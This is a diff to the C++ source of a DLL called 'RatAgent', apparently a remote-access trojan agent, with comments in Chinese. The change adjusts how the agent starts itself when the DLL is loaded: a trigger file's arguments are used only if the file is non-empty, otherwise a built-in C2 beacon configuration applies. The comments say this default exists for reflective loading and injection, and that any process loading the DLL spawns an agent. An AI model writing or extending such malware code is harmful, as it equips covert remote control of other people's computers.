@@ -11,10 +11,9 @@
 //
 // 自启动（本 DLL 的默认行为，加载即生效）：
 //   有 %LOCALAPPDATA%\RatAgent\<module>.autostart.args（或 %TEMP%\RatAgent\ 下同名文件）
-//     → 用文件里的参数串启动（优先级最高）；
-//   没有该文件
-//     → 用内置默认配置启动（beacon 127.0.0.1:8080、轮询 5s），供反射加载/注入这类
-//       没有参数通道的场景使用。
+//   且**内容非空** → 用文件里的参数串启动（优先级最高）；
+//   文件不存在 / 内容为空 → 一律用内置默认配置启动（beacon 127.0.0.1:8080、轮询 5s），
+//     供反射加载/注入这类没有参数通道的场景使用。
 //   ⚠ 代价：任何 LoadLibrary 本 DLL 的进程都会起一份 agent；且 DllMain 的自启（延迟
 //     300ms）与显式入口（rundll32 的 Start/Stop、宿主 StartAgent）存在竞争——显式入口
 //     先到就正常接管，晚到则可能被默认自启抢先（参数被忽略 / Stop 退化为同进程停止）。
@@ -185,14 +184,14 @@ namespace
     unsigned __stdcall autostart_proc(void*)
     {
         Sleep(300);
+        // 只有"触发器文件存在且内容非空"才走触发分支；文件不存在或内容为空 → 用内置默认配置
+        //（判空逻辑在 agent_autostart_requested 里，见 agent_runtime.cpp）
         std::string args;
         if (c2::agent_autostart_requested(args))
-            AGENT_LOG("[*] autostart (trigger) mode=%s\n", c2::agent_version());
+            AGENT_LOG("[*] autostart (trigger) args=\"%s\" mode=%s\n",
+                args.c_str(), c2::agent_version());
         else
-        {
             AGENT_LOG("[*] autostart (no trigger -> default config) mode=%s\n", c2::agent_version());
-            args.clear();
-        }
         start_from_args(args.empty() ? nullptr : args.c_str());
         return 0;
     }
